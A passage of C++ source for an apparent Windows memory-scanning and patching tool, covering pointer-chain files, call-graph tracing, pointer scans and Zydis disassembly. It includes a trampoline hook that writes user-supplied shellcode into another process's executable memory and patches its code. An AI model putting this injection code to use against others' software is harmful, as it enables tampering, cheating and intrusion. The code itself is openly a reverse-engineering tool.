    if (idx < 0 || idx >= (int)g_chains.size()) { LogToStatus("Click a chain line first", true); return; }
    bool ok = false;
    LPVOID a = ResolveChain(g_chains[idx], ok);
    if (!ok || !a) { LogToStatus("Chain unresolved (bad ptr or process not attached)", true); return; }
    SetSelectedAddress(a);
    int v = ReadValueFromAddress(a);
    char info[256];
    sprintf_s(info, "Selected (chain '%s'): 0x%p  =  %d", g_chains[idx].name.c_str(), a, v);
    SetWindowTextA(hStaticAddressInfo, info);
    char hex[32]; sprintf_s(hex, "0x%llX", (uintptr_t)a);
    SetWindowTextA(hEditScAddr, hex);
    SetWindowTextA(hEditNewValue, std::to_string(v).c_str());
    ShowHexAtAddress(a, a);
    EnableWindow(hBtnWrite, TRUE); EnableWindow(hBtnUndo, TRUE);
}

void SaveChainsToFile() {
    FILE* f = nullptr; fopen_s(&f, "memiscani_chains.txt", "w");
    if (!f) { LogToStatus("Could not open memiscani_chains.txt for writing", true); return; }
    fprintf(f, "# memiscani pointer chains v1\n");
    fprintf(f, "# Format: name|module|baseOffsetHex|off1,off2,...\n");
    for (auto& c : g_chains) {
        fprintf(f, "%s|%s|%llx|", c.name.c_str(), c.moduleName.c_str(),
            (unsigned long long)c.baseOffset);
        for (size_t k = 0; k < c.offsets.size(); k++) {
            fprintf(f, "%s%llx", k ? "," : "", (unsigned long long)c.offsets[k]);
        }
        fprintf(f, "\n");
    }
    fclose(f);
    char msg[128]; sprintf_s(msg, "Saved %zu chain(s) to memiscani_chains.txt", g_chains.size());
    LogToStatus(msg);
}

void LoadChainsFromFile() {
    FILE* f = nullptr; fopen_s(&f, "memiscani_chains.txt", "r");
    if (!f) { LogToStatus("memiscani_chains.txt not found", true); return; }
    g_chains.clear();
    char line[1024];
    while (fgets(line, sizeof(line), f)) {
        if (line[0] == '#' || line[0] == '\n' || line[0] == 0) continue;
        for (char* p = line; *p; p++) if (*p == '\n' || *p == '\r') { *p = 0; break; }
        char* parts[4] = {};
        int n = 0;
        char* p = line;
        parts[n++] = p;
        while (*p && n < 4) {
            if (*p == '|') { *p = 0; p++; if (n < 4) parts[n++] = p; }
            else p++;
        }
        if (n < 3) continue;
        PointerChain c;
        c.name = parts[0] ? parts[0] : "";
        c.moduleName = parts[1] ? parts[1] : "";
        c.baseOffset = parts[2] ? strtoull(parts[2], nullptr, 16) : 0;
        if (n == 4 && parts[3] && *parts[3]) {
            char* save = nullptr;
            char* tok = strtok_s(parts[3], ",", &save);
            while (tok) {
                c.offsets.push_back((intptr_t)strtoll(tok, nullptr, 16));
                tok = strtok_s(nullptr, ",", &save);
            }
        }
        g_chains.push_back(c);
    }
    fclose(f);
    char msg[128]; sprintf_s(msg, "Loaded %zu chain(s) from memiscani_chains.txt", g_chains.size());
    LogToStatus(msg);
    RefreshChainsUI();
}

void TraceCallGraph() {
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }
    char addrStr[64] = {}, depthStr[16] = {};
    GetWindowTextA(hEditCgAddr,  addrStr,  sizeof(addrStr));
    GetWindowTextA(hEditCgDepth, depthStr, sizeof(depthStr));
    uintptr_t startAddr = strtoull(addrStr, nullptr, 0);
    int maxDepth = atoi(depthStr); if (maxDepth <= 0) maxDepth = 3;
    if (maxDepth > 8) maxDepth = 8;
    if (!startAddr) { LogToStatus("Enter a starting address", true); return; }

    ClearEditText(hLstCallGraph);
    char hdr[256];
    sprintf_s(hdr, "=== Call graph from 0x%llX  depth=%d ===",
        (unsigned long long)startAddr, maxDepth);
    AppendEditText(hLstCallGraph, hdr);
    AppendEditText(hLstCallGraph, "  -> = direct call (E8 rel32)    => = direct jmp (E9 rel32)");
    AppendEditText(hLstCallGraph, "");

    struct Frame { uintptr_t addr; int depth; };
    std::vector<Frame> stack;
    std::set<uintptr_t> visited;
    stack.push_back({startAddr, 0});
    int totalCalls = 0;
    int maxFunctions = 200;

    while (!stack.empty() && (int)visited.size() < maxFunctions) {
        Frame fr = stack.back(); stack.pop_back();
        if (visited.count(fr.addr)) continue;
        visited.insert(fr.addr);

        BYTE buf[4096];
        SIZE_T r = 0;
        if (!ReadProcessMemory(hProcess, (LPCVOID)fr.addr, buf, sizeof(buf), &r) || r < 4)
            continue;

        char indent[64] = "";
        int ind = fr.depth * 2; if (ind > 60) ind = 60;
        for (int k = 0; k < ind; k++) indent[k] = ' ';
        indent[ind] = 0;

        char line[256];
        sprintf_s(line, "%s+- FUNC 0x%llX", indent, (unsigned long long)fr.addr);
        AppendEditText(hLstCallGraph, line);

        size_t pos = 0;
        int instrCount = 0;
        int maxInstrPerFn = 400;
        while (pos < r && instrCount < maxInstrPerFn) {
            char instr[256] = {};
            int consumed = DisasmOne(buf + pos, r - pos, fr.addr + pos, instr, sizeof(instr));
            if (consumed <= 0) consumed = 1;
            if (strncmp(instr, "ret", 3) == 0) break;

            uintptr_t target = 0;
            const char* edge = nullptr;
            if (buf[pos] == 0xE8 && pos + 5 <= r) {
                int32_t rel = *(int32_t*)(buf + pos + 1);
                target = fr.addr + pos + 5 + rel;
                edge = "->";
            } else if (buf[pos] == 0xE9 && pos + 5 <= r) {
                int32_t rel = *(int32_t*)(buf + pos + 1);
                target = fr.addr + pos + 5 + rel;
                edge = "=>";
            }

            if (edge && target) {
                char callLine[320];
                if (visited.count(target)) {
                    sprintf_s(callLine, "%s   %s 0x%llX  (already visited)",
                        indent, edge, (unsigned long long)target);
                } else {
                    sprintf_s(callLine, "%s   %s 0x%llX",
                        indent, edge, (unsigned long long)target);
                    if (fr.depth + 1 < maxDepth) {
                        stack.push_back({target, fr.depth + 1});
                    }
                }
                AppendEditText(hLstCallGraph, callLine);
                totalCalls++;
            }
            pos += consumed;
            instrCount++;
        }
    }

    char done[160];
    sprintf_s(done, "Call graph done: %zu unique function(s), %d edge(s) traced",
        visited.size(), totalCalls);
    AppendEditText(hLstCallGraph, "");
    AppendEditText(hLstCallGraph, done);
    LogToStatus(done);
}


static bool RelocateInstructions(const BYTE* orig, size_t origLen,
                                 uintptr_t origRip, uintptr_t newRip,
                                 std::vector<BYTE>& out, std::string& err) {
    static ZydisDecoder s_dec;
    static bool s_init = false;
    if (!s_init) {
        if (!ZYAN_SUCCESS(ZydisDecoderInit(&s_dec,
                ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64))) {
            err = "Zydis decoder init failed"; return false;
        }
        s_init = true;
    }
    out.clear();
    size_t pos = 0;
    while (pos < origLen) {
        ZydisDecodedInstruction ins;
        ZydisDecodedOperand ops[ZYDIS_MAX_OPERAND_COUNT];
        if (!ZYAN_SUCCESS(ZydisDecoderDecodeFull(&s_dec,
                orig + pos, origLen - pos, &ins, ops))) {
            char e[96]; sprintf_s(e, "decode failed at +%zu", pos);
            err = e; return false;
        }
        uintptr_t insOrigRip = origRip + pos;
        uintptr_t insNewRip  = newRip  + out.size();
        uintptr_t origNextRip = insOrigRip + ins.length;

        bool hasRipMem = false, hasRelImm = false;
        int64_t origTargetAbs = 0;
        ZyanU8 ripMemDispOffset = 0, ripMemDispSize = 0;
        for (int i = 0; i < ins.operand_count; i++) {
            if (ops[i].type == ZYDIS_OPERAND_TYPE_MEMORY &&
                ops[i].mem.base == ZYDIS_REGISTER_RIP) {
                hasRipMem = true;
                origTargetAbs = (int64_t)origNextRip + ops[i].mem.disp.value;
                ripMemDispOffset = ins.raw.disp.offset;
                ripMemDispSize   = ins.raw.disp.size;
                break;
            }
            if (ops[i].type == ZYDIS_OPERAND_TYPE_IMMEDIATE && ops[i].imm.is_relative) {
                hasRelImm = true;
                origTargetAbs = (int64_t)origNextRip + ops[i].imm.value.s;
                break;
            }
        }

        if (!hasRipMem && !hasRelImm) {
            for (size_t k = 0; k < ins.length; k++) out.push_back(orig[pos + k]);
            pos += ins.length; continue;
        }

        if (hasRipMem) {
            int64_t newDisp = origTargetAbs - (int64_t)(insNewRip + ins.length);
            if (newDisp < INT32_MIN || newDisp > INT32_MAX) {
                err = "rip-rel memory disp out of range (trampoline too far)"; return false;
            }
            if (ripMemDispSize != 32) {
                err = "unexpected rip-rel disp size"; return false;
            }
            size_t outBase = out.size();
            for (size_t k = 0; k < ins.length; k++) out.push_back(orig[pos + k]);
            int32_t r32 = (int32_t)newDisp;
            for (int b = 0; b < 4; b++)
                out[outBase + ripMemDispOffset + b] = (BYTE)((r32 >> (b*8)) & 0xFF);
        } else {
            BYTE first  = orig[pos];
            BYTE second = (ins.length > 1) ? orig[pos+1] : 0;
            if ((first == 0xE8 || first == 0xE9) && ins.length == 5) {
                int64_t newDisp = origTargetAbs - (int64_t)(insNewRip + 5);
                if (newDisp >= INT32_MIN && newDisp <= INT32_MAX) {
                    out.push_back(first);
                    int32_t r32 = (int32_t)newDisp;
                    for (int b = 0; b < 4; b++) out.push_back((BYTE)((r32 >> (b*8)) & 0xFF));
                } else if (first == 0xE9) {
                    out.push_back(0xFF); out.push_back(0x25);
                    out.push_back(0); out.push_back(0); out.push_back(0); out.push_back(0);
                    uintptr_t t = (uintptr_t)origTargetAbs;
                    for (int b = 0; b < 8; b++) out.push_back((BYTE)((t >> (b*8)) & 0xFF));
                } else {
                    out.push_back(0xFF); out.push_back(0x15);
                    out.push_back(0x02); out.push_back(0); out.push_back(0); out.push_back(0);
                    out.push_back(0xEB); out.push_back(0x08);
                    uintptr_t t = (uintptr_t)origTargetAbs;
                    for (int b = 0; b < 8; b++) out.push_back((BYTE)((t >> (b*8)) & 0xFF));
                }
            } else if (first == 0x0F && (second >= 0x80 && second <= 0x8F) && ins.length == 6) {
                int64_t newDisp = origTargetAbs - (int64_t)(insNewRip + 6);
                if (newDisp < INT32_MIN || newDisp > INT32_MAX) {
                    err = "long Jcc rel32 out of range"; return false;
                }
                out.push_back(0x0F); out.push_back(second);
                int32_t r32 = (int32_t)newDisp;
                for (int b = 0; b < 4; b++) out.push_back((BYTE)((r32 >> (b*8)) & 0xFF));
            } else if ((first >= 0x70 && first <= 0x7F) && ins.length == 2) {
                int64_t shortDisp = origTargetAbs - (int64_t)(insNewRip + 2);
                if (shortDisp >= -128 && shortDisp <= 127) {
                    out.push_back(first); out.push_back((BYTE)(int8_t)shortDisp);
                } else {
                    int64_t longDisp = origTargetAbs - (int64_t)(insNewRip + 6);
                    if (longDisp < INT32_MIN || longDisp > INT32_MAX) {
                        err = "Jcc rel8 cannot be relocated"; return false;
                    }
                    out.push_back(0x0F); out.push_back(first + 0x10);
                    int32_t r32 = (int32_t)longDisp;
                    for (int b = 0; b < 4; b++) out.push_back((BYTE)((r32 >> (b*8)) & 0xFF));
                }
            } else if (first == 0xEB && ins.length == 2) {
                int64_t shortDisp = origTargetAbs - (int64_t)(insNewRip + 2);
                if (shortDisp >= -128 && shortDisp <= 127) {
                    out.push_back(0xEB); out.push_back((BYTE)(int8_t)shortDisp);
                } else {
                    int64_t longDisp = origTargetAbs - (int64_t)(insNewRip + 5);
                    if (longDisp >= INT32_MIN && longDisp <= INT32_MAX) {
                        out.push_back(0xE9);
                        int32_t r32 = (int32_t)longDisp;
                        for (int b = 0; b < 4; b++) out.push_back((BYTE)((r32 >> (b*8)) & 0xFF));
                    } else {
                        out.push_back(0xFF); out.push_back(0x25);
                        out.push_back(0); out.push_back(0); out.push_back(0); out.push_back(0);
                        uintptr_t t = (uintptr_t)origTargetAbs;
                        for (int b = 0; b < 8; b++) out.push_back((BYTE)((t >> (b*8)) & 0xFF));
                    }
                }
            } else if ((first == 0xE0 || first == 0xE1 || first == 0xE2 || first == 0xE3) && ins.length == 2) {
                int64_t shortDisp = origTargetAbs - (int64_t)(insNewRip + 2);
                if (shortDisp >= -128 && shortDisp <= 127) {
                    out.push_back(first); out.push_back((BYTE)(int8_t)shortDisp);
                } else {
                    err = "loop/jrcxz rel8 out of range and has no long form"; return false;
                }
            } else {
                char e[128]; sprintf_s(e, "unhandled relative branch at +%zu (byte 0x%02X)", pos, first);
                err = e; return false;
            }
        }
        pos += ins.length;
    }
    return true;
}

static size_t DetectSpliceBoundary(const BYTE* prefetch, size_t prefetchLen, size_t minBytes, std::string& err) {
    static ZydisDecoder s_dec;
    static bool s_init = false;
    if (!s_init) {
        if (!ZYAN_SUCCESS(ZydisDecoderInit(&s_dec,
                ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64))) {
            err = "Zydis decoder init failed"; return 0;
        }
        s_init = true;
    }
    size_t pos = 0;
    while (pos < minBytes && pos < prefetchLen) {
        ZydisDecodedInstruction ins;
        ZydisDecodedOperand ops[ZYDIS_MAX_OPERAND_COUNT];
        if (!ZYAN_SUCCESS(ZydisDecoderDecodeFull(&s_dec,
                prefetch + pos, prefetchLen - pos, &ins, ops))) {
            char e[96]; sprintf_s(e, "decode failed during boundary scan at +%zu", pos);
            err = e; return 0;
        }
        pos += ins.length;
    }
    if (pos < minBytes) { err = "not enough bytes to find clean splice boundary"; return 0; }
    return pos;
}

void InstallTrampolineHook() {
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }
    char addrStr[64] = {}, scStr[8192] = {};
    GetWindowTextA(hEditHookAddr, addrStr, sizeof(addrStr));
    GetWindowTextA(hEditHookSc,   scStr,   sizeof(scStr));
    LPVOID target = (LPVOID)strtoull(addrStr, nullptr, 0);
    if (!target) { LogToStatus("Enter target address (hex 0x...)", true); return; }

    std::vector<BYTE> userSc; std::vector<bool> userMask;
    if (!ParseAOB(scStr, userSc, userMask) || userSc.empty()) {
        LogToStatus("Enter shellcode bytes (e.g. 48 31 C0 90 90)", true);
        return;
    }

    const SIZE_T jmpOutSize = 14;
    const SIZE_T jmpBackSize = 14;

    BYTE prefetch[64] = {};
    SIZE_T r = 0;
    if (!ReadProcessMemory(hProcess, target, prefetch, sizeof(prefetch), &r) || r < jmpOutSize) {
        LogToStatus("Failed to read target for boundary detection", true); return;
    }
    std::string berr;
    SIZE_T patchSize = DetectSpliceBoundary(prefetch, r, jmpOutSize, berr);
    if (!patchSize) {
        char msg[256]; sprintf_s(msg, "Splice boundary detection failed: %s", berr.c_str());
        LogToStatus(msg, true); return;
    }

    std::vector<BYTE> orig(prefetch, prefetch + patchSize);

    SIZE_T trampSize = userSc.size() + patchSize + jmpBackSize + 32;
    LPVOID tramp = VirtualAllocEx(hProcess, nullptr, trampSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!tramp) { LogToStatus("VirtualAllocEx (trampoline) failed", true); return; }

    std::vector<BYTE> relocated;
    std::string relErr;
    uintptr_t newRip = (uintptr_t)tramp + userSc.size();
    if (!RelocateInstructions(orig.data(), patchSize, (uintptr_t)target, newRip, relocated, relErr)) {
        VirtualFreeEx(hProcess, tramp, 0, MEM_RELEASE);
        char msg[256]; sprintf_s(msg, "Relocation failed: %s", relErr.c_str());
        LogToStatus(msg, true); return;
    }

    SIZE_T needed = userSc.size() + relocated.size() + jmpBackSize;
    if (needed > trampSize) {
        VirtualFreeEx(hProcess, tramp, 0, MEM_RELEASE);
        trampSize = needed;
        tramp = VirtualAllocEx(hProcess, nullptr, trampSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!tramp) { LogToStatus("VirtualAllocEx (resized trampoline) failed", true); return; }
        newRip = (uintptr_t)tramp + userSc.size();
        relocated.clear();
        if (!RelocateInstructions(orig.data(), patchSize, (uintptr_t)target, newRip, relocated, relErr)) {
            VirtualFreeEx(hProcess, tramp, 0, MEM_RELEASE);
            LogToStatus("Relocation failed after resize", true); return;
        }
    }

    std::vector<BYTE> trampBuf(trampSize, 0x90);
    memcpy(trampBuf.data(), userSc.data(), userSc.size());
    memcpy(trampBuf.data() + userSc.size(), relocated.data(), relocated.size());

    uintptr_t backAddr = (uintptr_t)target + patchSize;
    BYTE* jmpBack = trampBuf.data() + userSc.size() + relocated.size();
    jmpBack[0] = 0xFF; jmpBack[1] = 0x25;
    jmpBack[2] = jmpBack[3] = jmpBack[4] = jmpBack[5] = 0;
    memcpy(jmpBack + 6, &backAddr, 8);

    SIZE_T w;
    if (!WriteProcessMemory(hProcess, tramp, trampBuf.data(), trampSize, &w)) {
        VirtualFreeEx(hProcess, tramp, 0, MEM_RELEASE);
        LogToStatus("Failed to write trampoline", true); return;
    }

    std::vector<BYTE> patch(patchSize, 0x90);
    uintptr_t trampU = (uintptr_t)tramp;
    patch[0] = 0xFF; patch[1] = 0x25;
    patch[2] = patch[3] = patch[4] = patch[5] = 0;
    memcpy(patch.data() + 6, &trampU, 8);

    DWORD oldProt = 0;
    if (!VirtualProtectEx(hProcess, target, patchSize, PAGE_EXECUTE_READWRITE, &oldProt)) {
        VirtualFreeEx(hProcess, tramp, 0, MEM_RELEASE);
        LogToStatus("VirtualProtectEx failed on target", true); return;
    }
    if (!WriteProcessMemory(hProcess, target, patch.data(), patchSize, &w)) {
        VirtualProtectEx(hProcess, target, patchSize, oldProt, &oldProt);
        VirtualFreeEx(hProcess, tramp, 0, MEM_RELEASE);
        LogToStatus("Failed to patch target with JMP", true); return;
    }
    VirtualProtectEx(hProcess, target, patchSize, oldProt, &oldProt);
    FlushInstructionCache(hProcess, target, patchSize);

    HookRecord hr;
    hr.target = target;
    hr.patchSize = patchSize;
    hr.originalBytes = orig;
    hr.trampolineAddr = tramp;
    hr.trampolineSize = trampSize;
    hr.installed = true;
    char desc[160];
    sprintf_s(desc, "x64 abs JMP trampoline (splice=%zu, reloc=%zu)", patchSize, relocated.size());
    hr.description = desc;
    g_hooks.push_back(hr);

    char msg[256];
    sprintf_s(msg, "Hook installed: target=0x%p tramp=0x%p splice=%zuB reloc=%zuB",
        target, tramp, patchSize, relocated.size());
    LogToStatus(msg);
    RefreshHooksUI();
}

void RestoreSelectedHook() {
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }
    DWORD sel = 0;
    SendMessage(hLstHooks, EM_GETSEL, (WPARAM)&sel, 0);
    int li = (int)SendMessage(hLstHooks, EM_LINEFROMCHAR, (WPARAM)sel, 0);
    int idx = li - 2;
    if (idx < 0 || idx >= (int)g_hooks.size()) {
        LogToStatus("Click a hook line first", true); return;
    }
    HookRecord& h = g_hooks[idx];
    if (!h.installed) { LogToStatus("Hook already restored", true); return; }
    DWORD oldProt = 0;
    if (!VirtualProtectEx(hProcess, h.target, h.patchSize, PAGE_EXECUTE_READWRITE, &oldProt)) {
        LogToStatus("VirtualProtectEx failed", true); return;
    }
    SIZE_T w;
    WriteProcessMemory(hProcess, h.target, h.originalBytes.data(), h.patchSize, &w);
    VirtualProtectEx(hProcess, h.target, h.patchSize, oldProt, &oldProt);
    FlushInstructionCache(hProcess, h.target, h.patchSize);
    if (h.trampolineAddr) VirtualFreeEx(hProcess, h.trampolineAddr, 0, MEM_RELEASE);
    h.installed = false;
    LogToStatus("Hook restored and trampoline freed");
    RefreshHooksUI();
}

void RefreshHooksUI() {
    if (!hLstHooks) return;
    ClearEditText(hLstHooks);
    AppendEditText(hLstHooks, "Idx  Status     Target              Trampoline          Size   Description");
    AppendEditText(hLstHooks, "-----+----------+-------------------+-------------------+------+-------------------");
    for (int i = 0; i < (int)g_hooks.size(); i++) {
        HookRecord& h = g_hooks[i];
        char line[320];
        sprintf_s(line, "[%2d] %-9s  0x%016llX  0x%016llX  %5zu  %s",
            i, h.installed ? "ACTIVE" : "RESTORED",
            (unsigned long long)(uintptr_t)h.target,
            (unsigned long long)(uintptr_t)h.trampolineAddr,
            h.trampolineSize, h.description.c_str());
        AppendEditText(hLstHooks, line);
    }
}

void RunAutoPointerScan() {
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }

    char tgtStr[64] = {}, depthStr[16] = {}, offStr[16] = {};
    GetWindowTextA(hEditApsTarget, tgtStr, sizeof(tgtStr));
    GetWindowTextA(hEditApsDepth, depthStr, sizeof(depthStr));
    GetWindowTextA(hEditApsMaxOff, offStr, sizeof(offStr));
    uintptr_t target = strtoull(tgtStr, nullptr, 0);
    int maxDepth = atoi(depthStr); if (maxDepth <= 0) maxDepth = 3; if (maxDepth > 6) maxDepth = 6;
    intptr_t maxOff = (intptr_t)strtoll(offStr, nullptr, 0);
    if (maxOff <= 0) maxOff = 0x800;
    if (maxOff > 0x10000) maxOff = 0x10000;
    if (!target) { LogToStatus("Enter a valid target address (hex 0x...)", true); return; }

    ClearEditText(hLstApsResults);
    char hdr[256];
    sprintf_s(hdr, "=== AUTO POINTER SCAN  target=0x%llX  depth=%d  maxOff=0x%llX ===",
        (unsigned long long)target, maxDepth, (long long)maxOff);
    AppendEditText(hLstApsResults, hdr);

    struct ModRange { uintptr_t base; uintptr_t end; std::string name; };
    std::vector<ModRange> mods;
    {
        HMODULE hmods[1024]; DWORD needed = 0;
        if (EnumProcessModules(hProcess, hmods, sizeof(hmods), &needed)) {
            DWORD cnt = needed / sizeof(HMODULE);
            for (DWORD i = 0; i < cnt; i++) {
                char p[MAX_PATH] = {};
                GetModuleFileNameExA(hProcess, hmods[i], p, MAX_PATH);
                MODULEINFO mi = {};
                if (!GetModuleInformation(hProcess, hmods[i], &mi, sizeof(mi))) continue;
                const char* nm = strrchr(p, '\\'); nm = nm ? nm + 1 : p;
                ModRange m;
                m.base = (uintptr_t)mi.lpBaseOfDll;
                m.end  = m.base + mi.SizeOfImage;
                m.name = nm;
                mods.push_back(m);
            }
        }
    }
    auto inModule = [&](uintptr_t a) -> ModRange* {
        for (auto& m : mods) if (a >= m.base && a < m.end) return &m;
        return nullptr;
    };

    struct MemBlock { uintptr_t base; std::vector<BYTE> data; };
    std::vector<MemBlock> blocks;
    size_t totalRead = 0;
    {
        SYSTEM_INFO si; GetSystemInfo(&si);
        LPVOID addr = si.lpMinimumApplicationAddress;
        while (addr < si.lpMaximumApplicationAddress) {
            MEMORY_BASIC_INFORMATION mbi;
            if (VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi)) != sizeof(mbi)) break;
            if (mbi.State == MEM_COMMIT &&
                (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY | PAGE_EXECUTE_READ |
                                PAGE_EXECUTE_READWRITE | PAGE_WRITECOPY)) &&
                !(mbi.Protect & PAGE_GUARD)) {
                SIZE_T chunk = mbi.RegionSize;
                if (chunk > (SIZE_T)(8 * 1024 * 1024)) chunk = 8 * 1024 * 1024;
                MemBlock b;
                b.base = (uintptr_t)mbi.BaseAddress;
                b.data.resize(chunk);
                SIZE_T r;
                if (ReadProcessMemory(hProcess, mbi.BaseAddress, b.data.data(), chunk, &r) && r > 0) {
                    b.data.resize(r);
                    totalRead += r;
                    blocks.push_back(std::move(b));
                }
                if (totalRead > (size_t)1 * 1024 * 1024 * 1024) break;
            }
            addr = (LPVOID)((uintptr_t)mbi.BaseAddress + mbi.RegionSize);
        }
    }
    char snapMsg[160];
    sprintf_s(snapMsg, "Snapshot: %zu region(s), %zu MB scanned",
        blocks.size(), totalRead / (1024 * 1024));
    AppendEditText(hLstApsResults, snapMsg);

    struct LevelEntry { uintptr_t addr; std::vector<intptr_t> offsetsLeafFirst; };
    std::vector<LevelEntry> current;
    current.push_back({target, {}});

    g_lastAutoPtrScan.clear();
    const size_t MAX_PER_LEVEL = 8000;
    const size_t MAX_FINALS    = 500;

    std::set<uintptr_t> seenPtrs;

    for (int depth = 1; depth <= maxDepth && !current.empty(); depth++) {
        std::vector<uintptr_t> needles;
        needles.reserve(current.size());
        for (auto& e : current) needles.push_back(e.addr);

        std::vector<LevelEntry> next;
        for (auto& blk : blocks) {
            if (blk.data.size() < 8) continue;
            BYTE* buf = blk.data.data();
            size_t sz = blk.data.size();
            for (size_t off = 0; off + 8 <= sz; off += 8) {
                uintptr_t v;
                memcpy(&v, buf + off, 8);
                for (size_t ni = 0; ni < needles.size(); ni++) {
                    uintptr_t needle = needles[ni];
                    if (v <= needle && (needle - v) <= (uintptr_t)maxOff) {
                        intptr_t delta = (intptr_t)(needle - v);
                        uintptr_t pAddr = blk.base + off;
                        if (seenPtrs.insert(pAddr).second == false && depth > 1) continue;
                        LevelEntry ce;
                        ce.addr = pAddr;
                        ce.offsetsLeafFirst = current[ni].offsetsLeafFirst;
                        ce.offsetsLeafFirst.push_back(delta);

                        ModRange* mod = inModule(pAddr);
                        if (mod) {
                            AutoPtrScanResult fc;
                            fc.moduleName = mod->name;
                            fc.moduleBase = mod->base;
                            fc.baseOff    = pAddr - mod->base;
                            fc.offsets.assign(ce.offsetsLeafFirst.rbegin(), ce.offsetsLeafFirst.rend());
                            fc.resolved   = pAddr;
                            g_lastAutoPtrScan.push_back(fc);
                            if (g_lastAutoPtrScan.size() >= MAX_FINALS) goto scanDone;
                        }
                        if (next.size() < MAX_PER_LEVEL) next.push_back(ce);
                    }
                }
            }
        }
        char prog[160];
        sprintf_s(prog, "Depth %d: %zu candidate(s) carried, %zu static chain(s) so far",
            depth, next.size(), g_lastAutoPtrScan.size());
        AppendEditText(hLstApsResults, prog);
        current = std::move(next);
    }
    scanDone:

    AppendEditText(hLstApsResults, "");
    if (g_lastAutoPtrScan.empty()) {
        AppendEditText(hLstApsResults, "No static-rooted chains found.");
        AppendEditText(hLstApsResults, "Try larger depth/maxOff, or pick a different target.");
    } else {
        char fhdr[160];
        sprintf_s(fhdr, "=== %zu STATIC-ROOTED CHAIN(S) ===", g_lastAutoPtrScan.size());
        AppendEditText(hLstApsResults, fhdr);
        AppendEditText(hLstApsResults,
            "Idx  Module             +BaseOff           Offsets (chain order, root->leaf)");
        for (size_t i = 0; i < g_lastAutoPtrScan.size() && i < 200; i++) {
            AutoPtrScanResult& f = g_lastAutoPtrScan[i];
            std::string offs;
            for (size_t k = 0; k < f.offsets.size(); k++) {
                char b[40];
                sprintf_s(b, k ? ", +0x%llX" : "+0x%llX", (unsigned long long)f.offsets[k]);
                offs += b;
            }
            char line[640];
            sprintf_s(line, "[%3zu] %-18s +0x%-14llX  %s",
                i, f.moduleName.c_str(),
                (unsigned long long)f.baseOff, offs.c_str());
            AppendEditText(hLstApsResults, line);
        }
        if (g_lastAutoPtrScan.size() > 200) {
            char tr[96];
            sprintf_s(tr, "(%zu more chain(s) hidden - first 200 shown)",
                g_lastAutoPtrScan.size() - 200);
            AppendEditText(hLstApsResults, tr);
        }
    }

    AppendEditText(hLstApsResults, "");
    AppendEditText(hLstApsResults, "--- ZYDIS DISASSEMBLY AT TARGET (256 bytes) ---");
    {
        BYTE buf[256] = {};
        SIZE_T r = 0;
        if (ReadProcessMemory(hProcess, (LPCVOID)target, buf, sizeof(buf), &r) && r >= 8) {
            size_t pos = 0;
            int icount = 0;
            char line[480];
            while (pos < r && icount < 80) {
                char instr[200] = {};
                int n = DisasmOne(buf + pos, r - pos, target + pos, instr, sizeof(instr));
                if (n <= 0) n = 1;
                char hex[64] = {}; int hp = 0;
                for (int i = 0; i < n && hp < (int)sizeof(hex) - 4; i++)
                    hp += sprintf_s(hex + hp, sizeof(hex) - hp, "%02X ", buf[pos + i]);
                sprintf_s(line, "  0x%016llX  %-24s %s",
                    (unsigned long long)(target + pos), hex, instr);
                AppendEditText(hLstApsResults, line);
                pos += n; icount++;
            }
        } else {
            AppendEditText(hLstApsResults, "  (target memory not readable, or too short)");
        }
    }

    if (!g_lastAutoPtrScan.empty()) {
        AppendEditText(hLstApsResults, "");
        AppendEditText(hLstApsResults, "--- ZYDIS DISASSEMBLY AT EACH ROOT POINTER (first 4 chains, 64 B each) ---");
        size_t nDis = g_lastAutoPtrScan.size(); if (nDis > 4) nDis = 4;
        for (size_t i = 0; i < nDis; i++) {
            AutoPtrScanResult& f = g_lastAutoPtrScan[i];
            char sub[160];
            sprintf_s(sub, "  [chain %zu] root @ %s+0x%llX = 0x%llX",
                i, f.moduleName.c_str(),
                (unsigned long long)f.baseOff, (unsigned long long)f.resolved);
            AppendEditText(hLstApsResults, sub);
            BYTE buf[64] = {};
            SIZE_T r = 0;
            if (ReadProcessMemory(hProcess, (LPCVOID)f.resolved, buf, sizeof(buf), &r) && r >= 8) {
                size_t pos = 0; int ic = 0;
                while (pos < r && ic < 16) {
                    char instr[200] = {};
                    int n = DisasmOne(buf + pos, r - pos, f.resolved + pos, instr, sizeof(instr));
                    if (n <= 0) n = 1;
                    char hex[48] = {}; int hp = 0;
                    for (int b = 0; b < n && hp < (int)sizeof(hex) - 4; b++)
                        hp += sprintf_s(hex + hp, sizeof(hex) - hp, "%02X ", buf[pos + b]);
                    char line[400];
                    sprintf_s(line, "    0x%016llX  %-20s %s",
                        (unsigned long long)(f.resolved + pos), hex, instr);
                    AppendEditText(hLstApsResults, line);
                    pos += n; ic++;
                }
            }
        }
    }

    char done[128];
    sprintf_s(done, "Auto pointer scan complete: %zu chain(s)", g_lastAutoPtrScan.size());
    LogToStatus(done);
}

void DisasmWalkerRefresh() {
    if (!hLstDwDisasm) return;
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }

    char tgtStr[64] = {}, offStr[32] = {}, sizeStr[32] = {};
    GetWindowTextA(hEditDwTarget,   tgtStr,  sizeof(tgtStr));
    GetWindowTextA(hEditDwOffset,   offStr,  sizeof(offStr));
    GetWindowTextA(hEditDwViewSize, sizeStr, sizeof(sizeStr));

    uintptr_t target = strtoull(tgtStr, nullptr, 0);
    intptr_t  offset = (intptr_t)strtoll(offStr, nullptr, 0);
    int viewSize = (int)strtoul(sizeStr, nullptr, 0);
    if (viewSize <= 0)   viewSize = 256;
    if (viewSize > 4096) viewSize = 4096;
    if (!target) { LogToStatus("Enter a target address (hex 0x...)", true); return; }

    uintptr_t startAddr = (uintptr_t)((int64_t)target + (int64_t)offset);

    ClearEditText(hLstDwDisasm);
    char hdr[320];
    sprintf_s(hdr,
        "=== DISASM WALKER  target=0x%llX  offset=%s0x%llX  window=0x%llX..0x%llX  (%d B) ===",
        (unsigned long long)target,
        offset >= 0 ? "+" : "-",
